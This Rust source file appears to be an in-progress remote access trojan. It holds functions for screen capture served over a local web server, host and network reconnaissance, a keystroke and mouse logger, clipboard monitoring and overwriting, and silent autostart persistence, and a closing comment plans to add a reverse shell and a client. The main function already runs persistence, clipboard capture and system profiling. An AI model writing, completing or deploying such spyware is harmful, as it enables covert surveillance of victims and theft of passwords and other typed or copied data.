use actix_files::NamedFile;
use actix_web::{web, App, HttpResponse, HttpServer, Result};
use arboard::Clipboard;
use local_ip_address::local_ip;
use reqwest;
use serde::Deserialize;
use std::collections::HashMap;
use std::io;
use std::path::PathBuf;
use std::process::Command;
use std::sync::Mutex;
use sysinfo::System;
use tokio::time::sleep;
use whoami;

struct AppState {
    screenshot_file: Mutex<String>,
}

// Index page handler
async fn index() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/index.html")))
}

// Screenshot handler
async fn screenshot() -> Result<HttpResponse> {
    let output_file = "screenshot.png";
    let linux_tools = [
        ("scrot", format!("scrot {}", output_file)),
        ("spectacle", format!("spectacle -b -o {}", output_file)),
        ("import", format!("import -window root {}", output_file)),
        ("maim", format!("maim {}", output_file)),
        ("xwd", format!("xwd -root | convert xwd:- {}", output_file)),
    ];

    let windows_tools = [("nircmd", format!("nircmd savescreenshot {}", output_file))];

    let tools = if cfg!(target_os = "linux") {
        linux_tools.iter()
    } else if cfg!(target_os = "windows") {
        windows_tools.iter()
    } else {
        panic!("Unsupported OS");
    };

    let mut screenshot_taken = false;
    for (tool, cmd) in tools {
        if Command::new(tool).output().is_ok() {
            let output = Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .output()
                .expect("Failed to execute screenshot command");

            if output.status.success() {
                screenshot_taken = true;
                break;
            }
        }
    }

    if !screenshot_taken {
        return Ok(HttpResponse::InternalServerError().body("Failed to take screenshot"));
    }

    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/screenshot.html")))
}

// Get screenshot handler
async fn get_screenshot() -> Result<NamedFile> {
    let path: PathBuf = "screenshot.png".parse().unwrap();
    Ok(NamedFile::open(path)?)
}

// Camera page handler
async fn camera() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/camera.html")))
}

// Information list function
#[derive(Deserialize)]
struct IpInfo {
    ip: String,
    region: String,
    org: String,
}

async fn get_public_ip_info() -> Result<IpInfo, reqwest::Error> {
    let response = reqwest::get("https://ipinfo.io/json").await?;
    let ip_info: IpInfo = response.json().await?;
    Ok(ip_info)
}

fn get_default_gateway() -> Result<String, std::io::Error> {
    let output = if cfg!(target_os = "windows") {
        Command::new("powershell")
            .arg("-NoProfile")
            .arg("-Command")
            .arg("Get-NetRoute -AddressFamily IPv4 | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' } | Select-Object -ExpandProperty NextHop")
            .output()?
    } else {
        Command::new("sh")
            .arg("-c")
            .arg("ip route | grep default | awk '{print $3}'")
            .output()?
    };

    let gateway = String::from_utf8_lossy(&output.stdout).trim().to_string();
    Ok(gateway)
}

async fn display_system_info() -> Result<(), Box<dyn std::error::Error>> {
    let mut system = System::new_all();
    system.refresh_all();

    let cpu_info = system.global_cpu_info();
    let cpu_name = cpu_info.name();
    let cpu_usage = cpu_info.cpu_usage();

    let total_memory = system.total_memory();
    let used_memory = system.used_memory();

    let hostname = whoami::hostname();
    let username = whoami::username();
    let realname = whoami::realname();
    let os = whoami::distro();
    let device_name = whoami::devicename();
    let desktop_env = whoami::desktop_env();
    let platform = whoami::platform();
    let architecture = whoami::arch();
    let private_ip = local_ip().unwrap();

    let public_ip_info = get_public_ip_info().await.unwrap_or(IpInfo {
        ip: "Unavailable".to_string(),
        region: "Unavailable".to_string(),
        org: "Unavailable".to_string(),
    });

    let default_gateway = get_default_gateway().unwrap_or_else(|_| "Unknown".to_string());

    let mut system_info = HashMap::new();
    system_info.insert("CPU Name", cpu_name.to_string());
    system_info.insert("CPU Usage", format!("{:.2}%", cpu_usage));
    system_info.insert("Total Memory", format!("{} MB", total_memory / 1024));
    system_info.insert("Used Memory", format!("{} MB", used_memory / 1024));
    system_info.insert("Hostname", hostname);
    system_info.insert("Username", username);
    system_info.insert("Real Name", realname);
    system_info.insert("OS", os);
    system_info.insert("Device Name", device_name);
    system_info.insert("Desktop Environment", format!("{:?}", desktop_env));
    system_info.insert("Platform", format!("{:?}", platform));
    system_info.insert("Architecture", format!("{:?}", architecture));
    system_info.insert("Private IP", private_ip.to_string());
    system_info.insert("Public IP", public_ip_info.ip);
    system_info.insert("Region", public_ip_info.region);
    system_info.insert("ISP", public_ip_info.org);
    system_info.insert("Default Gateway", default_gateway);

    for (key, value) in &system_info {
        println!("{}: {}", key, value);
    }

    Ok(())
}

// Key/mouse logger function
fn log_key_mouse() {
    use rdev::{listen, Event};

    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }

    fn callback(event: Event) {
        println!("My callback {:?}", event);
        match event.name {
            Some(string) => println!("User wrote {:?}", string),
            None => (),
        }
    }
}

// Clipboard listen function
async fn clipboard_listen() {
    let mut clipboard = Clipboard::new().unwrap();
    let mut previous_content = String::new();

    loop {
        match clipboard.get_text() {
            Ok(current_content) => {
                if current_content != previous_content {
                    println!("Clipboard content changed: {}", current_content);
                    previous_content = current_content;
                }
            }
            Err(e) => {
                println!("Failed to get clipboard content: {}", e);
            }
        }
        sleep(tokio::time::Duration::from_secs(1)).await;
    }
}

// Clipboard send function
fn clipboard_send() {
    let mut clipboard = Clipboard::new().unwrap();

    match clipboard.get_text() {
        Ok(text) => println!("Clipboard text was: {}", text),
        Err(e) => println!("Failed to get clipboard content: {}", e),
    }

    let new_text = "Hello, world!";
    clipboard.set_text(new_text).unwrap();
    println!("Clipboard text is now: \"{}\"", new_text);
}

// Auto-launch function
fn setup_autolaunch() {
    use auto_launch::AutoLaunch;

    let app_name = "my_program";
    let exec_path = std::env::current_exe().expect("Failed to get current executable path");
    let exec_path_str = exec_path
        .to_str()
        .expect("Failed to convert path to string");

    let auto = AutoLaunch::new(app_name, exec_path_str, &["--minimized"]);

    match auto.enable() {
        Ok(_) => println!("Autostart enabled successfully"),
        Err(e) => eprintln!("Failed to enable autostart: {}", e),
    }

    if auto.is_enabled().unwrap() {
        println!("Autostart is enabled");
    } else {
        println!("Autostart is not enabled");
    }
}

// Main function
#[actix_web::main]
async fn main() -> io::Result<()> {
    // let app_state = web::Data::new(AppState {
    //     screenshot_file: Mutex::new(String::from("screenshot.png")),
    // });

    // // Start the HTTP server
    // HttpServer::new(move || {
    //     App::new()
    //         .app_data(app_state.clone())
    //         .route("/", web::get().to(index))
    //         .route("/screenshot", web::get().to(screenshot))
    //         .route("/get_screenshot", web::get().to(get_screenshot))
    //         .route("/camera", web::get().to(camera))
    // })
    // .bind("127.0.0.1:8080")?
    // .run()
    // .await?;

    // Start the other functions
    // log_key_mouse();

    clipboard_send();
    setup_autolaunch();
    if let Err(err) = display_system_info().await {
        eprintln!("Failed to display system info: {}", err);
    }
    clipboard_listen().await;

    Ok(())
}
// need reverse shell + python client
